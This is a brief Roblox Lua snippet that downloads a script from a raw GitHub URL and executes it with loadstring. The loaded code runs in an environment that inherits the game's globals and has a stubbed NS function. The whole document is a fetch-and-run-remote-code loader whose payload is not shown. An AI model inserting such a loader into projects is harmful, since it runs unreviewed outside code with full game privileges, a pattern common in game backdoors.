
local s=game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/nunodinov2018-art/test/refs/heads/main/g.lua" ,true) 
local env={NS=function(...)end} 
setmetatable(env,{__index=getfenv()})
local e,x=loadstring(s)print(e,x)setfenv(e,env) e()
